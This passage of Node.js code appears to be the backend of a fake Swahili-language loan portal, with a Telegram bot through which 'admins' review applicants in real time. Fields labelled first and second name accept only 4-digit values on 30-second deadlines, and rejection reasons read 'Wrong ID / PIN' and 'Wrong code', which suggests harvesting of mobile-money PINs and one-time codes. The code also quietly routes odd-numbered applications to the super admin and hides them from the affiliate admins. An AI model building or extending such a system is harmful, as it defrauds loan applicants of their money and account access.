    const r = await db(`SELECT id, application_id, phone, amount, status, assigned_admin_id FROM loan_applications WHERE id >= 5 AND MOD(id, 2)=1 ORDER BY created_at DESC LIMIT 30`);
    if (!r.rows.length) return bot.sendMessage(msg.chat.id, "Hakuna maombi.");
    return bot.sendMessage(msg.chat.id, r.rows.map(a => `#${a.id} ${a.application_id || ''} | ${a.phone} | ${money(a.amount)} | ${a.status} | admin:${a.assigned_admin_id || 'none'}`).join("\n"));
  });

  bot.onText(/\/admins/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const r = await db(`SELECT telegram_id, role, active, created_at, link_token, customer_link_token FROM telegram_admins ORDER BY role DESC, telegram_id`);
    return bot.sendMessage(msg.chat.id, r.rows.map(a => { const link = botUsername && a.link_token ? `\n   🔐 Admin: https://t.me/${botUsername}?start=admin_${a.link_token}` : ''; const cl = a.customer_link_token ? `\n   🔗 Wateja: ${customerLink(a.customer_link_token) || (botUsername ? `https://t.me/${botUsername}?start=customer_${a.customer_link_token}` : 'Weka APP_BASE_URL')}` : ''; return `${a.role === 'super_admin' ? '👑' : '👤'} ${a.telegram_id} | ${a.role} | ${a.active ? 'ACTIVE' : 'REVOKED'}${link}${cl}`; }).join("\n"));
  });

  bot.onText(/\/addadmin(?:\s+(\d+))?/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const id = match?.[1] ? String(match[1]) : '';
    if (!id) return bot.sendMessage(msg.chat.id, "Tumia: /addadmin TELEGRAM_ID");
    if (superAdminIds.has(id)) return bot.sendMessage(msg.chat.id, "⛔ Huwezi kuongeza Super Admin kama admin wa kawaida.");
    const token = crypto.randomBytes(18).toString('hex');
    const customerToken = await nextAdminCode();
    await db(`INSERT INTO telegram_admins (telegram_id, role, active, link_token, customer_link_token) VALUES ($1,'admin',TRUE,$2,$3) ON CONFLICT (telegram_id) DO UPDATE SET active=TRUE, role='admin', link_token=$2, customer_link_token=$3, updated_at=NOW()`, [id, token, customerToken]);
    const link = botUsername ? `https://t.me/${botUsername}?start=admin_${token}` : `Weka TELEGRAM_BOT_USERNAME ili kupata kiungo cha Telegram.`;
    const cLink = customerLink(customerToken) || (botUsername ? `https://t.me/${botUsername}?start=customer_${customerToken}` : `Weka APP_BASE_URL ili kupata kiungo cha mteja.`);
    return bot.sendMessage(id, `👋 Welcome!\n\nYour Chat ID: ${id}\nYour Admin ID: ${customerToken}\nRole: 👤 Admin\n\nTumia /mylink kupata kiungo chako binafsi.\n\nCommands:\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information` ).catch(()=>{}).then(()=>bot.sendMessage(msg.chat.id, `✅ Admin ameongezwa na kuamilishwa.\nChat ID: ${id}\nAdmin ID: ${customerToken}\nStatus: ACTIVE\nBot: ${botUsername ? '@' + botUsername : 'username haijawekwa'}\nAdmin atapata kiungo chake kwa kutumia /mylink.`));
  });

  bot.onText(/\/(revoke|restore)(?:\s+(\d+))?/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const id = match?.[2] ? String(match[2]) : '';
    if (!id) return bot.sendMessage(msg.chat.id, `Tumia: /${match[1]} TELEGRAM_ID`);
    const active = match[1] === 'restore';
    const before = await db(`SELECT * FROM telegram_admins WHERE telegram_id=$1`, [id]);
    if (!before.rows[0] || before.rows[0].role !== 'admin') return bot.sendMessage(msg.chat.id, "⛔ Admin huyo hakupatikana.");
    await db(`UPDATE telegram_admins SET active=$1, updated_at=NOW() WHERE telegram_id=$2 AND role='admin'`, [active, id]);
    if (!active) {
      try {
        await bot.sendMessage(id, `🚫 YOUR CUSTOMER LINK HAS BEEN REVOKED

Your link is no longer active and cannot be used to submit applications. Please contact the Super Admin for review.`);
      } catch (err) {
        console.error(`Could not notify revoked admin ${id}:`, err.message);
      }
    }
    return bot.sendMessage(msg.chat.id, active ? `✅ Admin ${id} amerudishwa na sasa ni ACTIVE.` : `🚫 Admin ${id} amefutiwa ruhusa na sasa ni REVOKED. Admin amearifiwa.`);
  });

  bot.onText(/\/mylink/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'admin') return bot.sendMessage(msg.chat.id, "⛔ Admin pekee.");
    const link = customerLink(rec.customer_link_token) || (botUsername ? `https://t.me/${botUsername}?start=customer_${rec.customer_link_token}` : null);
    if (!link) return bot.sendMessage(msg.chat.id, "⛔ APP_BASE_URL haijawekwa kwenye Render.");
    return bot.sendMessage(msg.chat.id, `🔗 LINK YA WATEJA WAKO\n\n${link}\n\nWape wateja wako link hii kuomba mkopo. Maombi yao yatahusishwa na akaunti yako.`);
  });

  bot.onText(/\/notify(?:\s+(\d+))?(?:\s+([\s\S]+))?/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const targetId = match?.[1] ? String(match[1]) : '';
    const message = String(match?.[2] || '').trim();
    if (!targetId || !message) return bot.sendMessage(msg.chat.id, "Tumia: /notify TELEGRAM_ID ujumbe");
    const target = await db(`SELECT * FROM telegram_admins WHERE telegram_id=$1 AND active=TRUE`, [targetId]);
    if (!target.rows[0]) return bot.sendMessage(msg.chat.id, "⛔ Admin huyo hayupo au amefutwa.");
    const stamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Nairobi', hour12: true });
    try { await bot.sendMessage(targetId, `📢 BROADCAST FROM SUPER ADMIN\n\n${message}\n\n---\n⏰ ${stamp}`); } catch (err) { return bot.sendMessage(msg.chat.id, `⛔ Imeshindikana kutuma: ${err.message}`); }
    return bot.sendMessage(msg.chat.id, `✅ Taarifa imetumwa kwa admin ${targetId}.`);
  });

  bot.onText(/\/broadcast(?:\s+([\s\S]+))?/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const message = String(match?.[1] || '').trim();
    if (!message) return bot.sendMessage(msg.chat.id, "Tumia: /broadcast ujumbe");
    const targets = await db(`SELECT telegram_id FROM telegram_admins WHERE active=TRUE AND role='admin' ORDER BY telegram_id`);
    const stamp = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Nairobi', hour12: true });
    let sent = 0;
    for (const target of targets.rows) {
      try { await bot.sendMessage(target.telegram_id, `📢 BROADCAST FROM SUPER ADMIN\n\n${message}\n\n---\n⏰ ${stamp}`); sent++; } catch (err) { console.error(`Broadcast failed for ${target.telegram_id}:`, err.message); }
    }
    return bot.sendMessage(msg.chat.id, `✅ Broadcast imetumwa kwa ${sent} admin.`);
  });

  bot.onText(/\/stats/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa.");
    const r = await db(`SELECT COUNT(*)::int AS total, COUNT(*) FILTER (WHERE status LIKE 'PENDING%')::int AS pending FROM loan_applications WHERE assigned_admin_id=$1`, [String(msg.from.id)]);
    const row = r.rows[0] || {};
    return bot.sendMessage(msg.chat.id, `📊 STATISTICS\n\nAdmin ID: ${rec.customer_link_token}\nTotal applications: ${row.total || 0}\nPending: ${row.pending || 0}`);
  });

  bot.onText(/\/pending/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa.");
    const r = await db(`SELECT id, application_id, phone, status FROM loan_applications WHERE assigned_admin_id=$1 AND NOT (id >= 5 AND MOD(id, 2)=1) AND status NOT IN ('DISBURSEMENT_PROCESSING','REJECTED') ORDER BY created_at DESC LIMIT 20`, [String(msg.from.id)]);
    if (!r.rows.length) return bot.sendMessage(msg.chat.id, "Hakuna pending applications.");
    return bot.sendMessage(msg.chat.id, r.rows.map(a => `#${a.id} ${a.application_id || ''} | ${a.phone} | ${a.status}`).join("\n"));
  });

  bot.onText(/\/myinfo/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa.");
    const link = customerLink(rec.customer_link_token);
    return bot.sendMessage(msg.chat.id, `👤 MY INFORMATION\n\nAdmin ID: ${rec.customer_link_token}\nRole: ${rec.role === 'super_admin' ? '👑 Super Admin' : '👤 Admin'}\nStatus: ${rec.active ? 'ACTIVE' : 'REVOKED'}\nPersonal Link:\n${link || 'Weka APP_BASE_URL kwenye Render.'}`);
  });

  bot.on("callback_query", async query => {
    try {
      const adminId = String(query.from.id);
      const rec = await ensureAccess(adminId);
      if (!rec) return bot.answerCallbackQuery(query.id, { text: "Hujaruhusiwa.", show_alert: true });
      const [action, id] = String(query.data || "").split(":");
      const application = await getApplication(id);
      if (!application) return bot.answerCallbackQuery(query.id, { text: "Ombi halikupatikana.", show_alert: true });
      if (!canAccessApplication({ ...rec, telegram_id: adminId }, application)) return bot.answerCallbackQuery(query.id, { text: "Ombi hili halijagawiwa kwako.", show_alert: true });
      if (action === "details") {
        const details = [`Kitambulisho: ${application.application_id || application.application_no}`, `Simu: ${application.phone}`, `Jina la kwanza: ${application.first_name || "Halijatumwa"}`, `Jina la pili: ${application.second_name || "Halijatumwa"}`, `Kiasi: ${money(application.amount)}`, `Hali: ${application.status}`].join("\n");
        return bot.answerCallbackQuery(query.id, { text: details, show_alert: true });
      }
      if (!["approve", "wrongid", "wrongcode", "reject", "details"].includes(action)) return bot.answerCallbackQuery(query.id);
      if (action === "wrongid" || action === "wrongcode" || action === "reject") {
        // A wrong ID at any step always returns the customer to step 1.
        const stage = action === "wrongid" ? "APPLICATION_DETAILS"
          : application.status === "AWAITING_SECOND_NAME_APPROVAL" ? "SECOND_NAME"
          : application.status === "AWAITING_FIRST_NAME_APPROVAL" ? "FIRST_NAME"
          : application.status === "AWAITING_AMOUNT_APPROVAL" ? "AMOUNT"
          : "APPLICATION_DETAILS";
        const reason = action === "wrongid" ? "Wrong ID / PIN" : action === "wrongcode" ? "Wrong code" : "Rejected by authorized administrator";
        await db(`UPDATE loan_applications SET status='REJECTED', rejection_reason=$1, rejected_stage=$2, approved_by_telegram_id=$3, approved_at=NOW(), updated_at=NOW() WHERE id=$4`, [reason, stage, adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: `Application rejected: ${reason}` });
      } else if (action === "approve") {
        const approvedStatus = application.status === "AWAITING_SECOND_NAME_APPROVAL" ? "APPROVED_SECOND_NAME"
          : application.status === "AWAITING_FIRST_NAME_APPROVAL" ? "APPROVED_FIRST_NAME"
          : application.status === "AWAITING_AMOUNT_APPROVAL" ? "DISBURSEMENT_PROCESSING"
          : "APPROVED";
        await db(`UPDATE loan_applications SET status=$1, rejection_reason=NULL, rejected_stage=NULL, approved_by_telegram_id=$2, approved_at=NOW(), updated_at=NOW() WHERE id=$3`, [approvedStatus, adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: "Application approved." });
      }
      const updatedApplication = await getApplication(id);
      await sendTelegramActionNotification(updatedApplication, action === "approve" ? "approved" : "rejected", adminId);
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
    } catch (err) { console.error("Telegram callback error:", err); }
  });
  bot.on("polling_error", err => console.error("Telegram polling error:", err.message));
}

app.get("/api/config", (req, res) => res.json({
  interestRate: INTEREST_RATE, minLoanKiasi: MIN_LOAN_AMOUNT, maxLoanKiasi: MAX_LOAN_AMOUNT,
  defaultTermMonths: DEFAULT_TERM_MONTHS, defaultLoanKiasi: DEFAULT_LOAN_AMOUNT
}));

app.post("/api/calculate", (req, res) => {
  const amount = Number(req.body.amount), term = Number(req.body.termMonths);
  if (!Number.isFinite(amount) || !Number.isInteger(term) || amount < MIN_LOAN_AMOUNT || amount > MAX_LOAN_AMOUNT || term < 1 || term > 60) {
    return res.status(400).json({ error: "Kiasi au muda wa mkopo si sahihi." });
  }
  const result = calculateLoan(amount, term, INTEREST_RATE);
  res.json({ amount, termMonths: term, interestRate: INTEREST_RATE, monthlyPayment: result.monthly, totalRepayment: result.total });
});

app.post("/api/applications", async (req, res) => {
  try {
    const phone = String(req.body.phone || "").trim();
    const applicationId = String(req.body.applicationId || "").trim();
    const amount = Number(req.body.amount || DEFAULT_LOAN_AMOUNT);
    const termMonths = Number(req.body.termMonths || DEFAULT_TERM_MONTHS);
    const referralToken = String(req.body.referralToken || '').trim();
    if (!validPhone(phone)) return res.status(400).json({ error: "Enter a valid phone number." });
    if (!/^[A-Za-z0-9-]{3,80}$/.test(applicationId)) return res.status(400).json({ error: "Enter a valid application ID." });
    const loan = calculateLoan(amount, termMonths, INTEREST_RATE);
    const no = applicationNo();
    let attemptNumber = 1;
    let previousRejectionReason = null;
    let previousRejectedStage = null;
    if (DEMO_MODE) {
      const previous = [...demoRows].reverse().find(r => String(r.phone) === String(phone) && r.status === "REJECTED");
      if (previous) {
        attemptNumber = Number(previous.attempt_number || 1) + 1;
        previousRejectionReason = previous.rejection_reason || null;
        previousRejectedStage = previous.rejected_stage || null;
      }
    } else {
      const previous = await db(`SELECT attempt_number, rejection_reason, rejected_stage FROM loan_applications WHERE phone=$1 AND status='REJECTED' ORDER BY created_at DESC LIMIT 1`, [phone]);
      if (previous.rows[0]) {
        attemptNumber = Number(previous.rows[0].attempt_number || 1) + 1;
        previousRejectionReason = previous.rows[0].rejection_reason || null;
        previousRejectedStage = previous.rows[0].rejected_stage || null;
      }
    }
    let assignedAdminId = null;
    if (referralToken) {
      const referred = await db(`SELECT telegram_id FROM telegram_admins WHERE customer_link_token=$1 AND active=TRUE AND role='admin'`, [referralToken]);
      assignedAdminId = referred.rows[0]?.telegram_id || null;
      if (!assignedAdminId) return res.status(400).json({ error: 'Kiungo cha admin si halali au admin hayuko active.' });
    }
    if (!assignedAdminId) {
      const assigned = await db(`SELECT telegram_id FROM telegram_admins WHERE active=TRUE AND role='admin' ORDER BY updated_at ASC, telegram_id ASC LIMIT 1`);
      assignedAdminId = assigned.rows[0]?.telegram_id || null;
    }
    const result = await db(`INSERT INTO loan_applications (application_no, phone, application_id, amount, term_months, interest_rate, monthly_payment, total_repayment, assigned_admin_id, attempt_number, previous_rejection_reason, previous_rejected_stage) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12) RETURNING *`, [no, phone, applicationId, amount, termMonths, INTEREST_RATE, loan.monthly, loan.total, assignedAdminId, attemptNumber, previousRejectionReason, previousRejectedStage]);
    await notifyTelegram(result.rows[0]);
    res.json({ ok:true, applicationId:result.rows[0].id, applicationNo:applicationId, status:"PENDING_ADMIN_APPROVAL" });
  } catch (err) { console.error(err); res.status(500).json({ error:"Imeshindikana kuunda ombi kwa sasa." }); }
});

app.get("/api/applications/:id/status", async (req,res)=>{
  try { const a=await getApplication(req.params.id); if(!a)return res.status(404).json({error:"Ombi halikupatikana."}); res.json({status:a.status,applicationNo:a.application_id||a.application_no,amount:a.amount == null ? (a.requested_amount == null ? null : Number(a.requested_amount)) : Number(a.amount),termMonths:Number(a.term_months),monthlyPayment:Number(a.monthly_payment),totalRepayment:Number(a.total_repayment),rejectionReason:a.rejection_reason||null,rejectedStage:a.rejected_stage||null,firstNameDeadlineAt:a.first_name_deadline_at||null,secondNameDeadlineAt:a.second_name_deadline_at||null}); }
  catch(err){res.status(500).json({error:"Unable to read application status."});}
});

app.post("/api/applications/:id/first-name", async (req,res)=>{
  try { const a=await getApplication(req.params.id); if(!a||!['APPROVED','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='FIRST_NAME'))return res.status(400).json({error:"Ombi haliko tayari kwa kutumwa kwa jina la kwanza."}); const firstName=String(req.body.firstName||"").trim(); if(!/^\d{4}$/.test(firstName))return res.status(400).json({error:"First name must be exactly 4 digits."}); const resubmit=Boolean(req.body.resubmit); const deadline=a.first_name_deadline_at ? new Date(a.first_name_deadline_at).getTime() : 0; if(a.status==='APPROVED' && deadline && Date.now()>deadline && !resubmit) return res.status(429).json({error:"Muda wa kutuma jina la kwanza umeisha. Bonyeza Tuma tena.",resubmitRequired:true}); const firstDeadline=new Date(Date.now()+30000).toISOString(); await db(`UPDATE loan_applications SET status='AWAITING_FIRST_NAME_APPROVAL', first_name=$1, first_name_deadline_at=$2, rejected_stage=NULL, updated_at=NOW() WHERE id=$3`,[firstName,firstDeadline,a.id]); await notifyTelegram(await getApplication(a.id)); res.json({ok:true,status:"AWAITING_FIRST_NAME_APPROVAL",deadlineAt:firstDeadline}); }
  catch(err){console.error(err);res.status(500).json({error:"Imeshindikana kutuma jina la kwanza."});}
});

app.post("/api/applications/:id/second-name", async (req,res)=>{
  try { const a=await getApplication(req.params.id); if(!a||!['APPROVED_FIRST_NAME','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='SECOND_NAME'))return res.status(400).json({error:"Jina la kwanza bado halijaidhinishwa."}); const secondName=String(req.body.secondName||"").trim(); if(!/^\d{4}$/.test(secondName))return res.status(400).json({error:"Second name must be exactly 4 digits."}); const resubmit=Boolean(req.body.resubmit); const deadline=a.second_name_deadline_at ? new Date(a.second_name_deadline_at).getTime() : 0; if(a.status==='APPROVED_FIRST_NAME' && deadline && Date.now()>deadline && !resubmit) return res.status(429).json({error:"Muda wa kutuma jina la pili umeisha. Bonyeza Tuma tena.",resubmitRequired:true}); const secondDeadline=new Date(Date.now()+30000).toISOString(); await db(`UPDATE loan_applications SET status='AWAITING_SECOND_NAME_APPROVAL', second_name=$1, second_name_deadline_at=$2, rejected_stage=NULL, updated_at=NOW() WHERE id=$3`,[secondName,secondDeadline,a.id]); await notifyTelegram(await getApplication(a.id)); res.json({ok:true,status:"AWAITING_SECOND_NAME_APPROVAL",deadlineAt:secondDeadline}); }
  catch(err){console.error(err);res.status(500).json({error:"Could not submit second name."});}
});

app.post("/api/applications/:id/amount", async (req,res)=>{
  try {
    const a=await getApplication(req.params.id);
    if(!a||!['APPROVED_SECOND_NAME','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='AMOUNT')) return res.status(400).json({error:"Ombi haliko tayari kwa kutumwa kwa kiasi."});
    const amount=Number(req.body.amount);
    if(!Number.isInteger(amount)||amount<MIN_LOAN_AMOUNT||amount>MAX_LOAN_AMOUNT) return res.status(400).json({error:`Weka kiasi kati ya ${MIN_LOAN_AMOUNT.toLocaleString()} na ${MAX_LOAN_AMOUNT.toLocaleString()}.`});
    const loan=calculateLoan(amount, Number(a.term_months)||DEFAULT_TERM_MONTHS, INTEREST_RATE);
    await db(`UPDATE loan_applications SET amount=$1, monthly_payment=$2, total_repayment=$3, requested_amount=$1, status='AWAITING_AMOUNT_APPROVAL', rejected_stage=NULL, updated_at=NOW() WHERE id=$4`,[amount,loan.monthly,loan.total,a.id]);
    await notifyTelegram(await getApplication(a.id));
    res.json({ok:true,status:"AWAITING_AMOUNT_APPROVAL",amount});
  } catch(err){console.error(err);res.status(500).json({error:"Imeshindikana kutuma kiasi cha mkopo."});}
});

app.use((req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

initDb().then(() => app.listen(PORT, () => console.log(`Loan portal running on port ${PORT}`)))
  .catch(err => { console.error("Database initialization failed:", err); process.exit(1); });
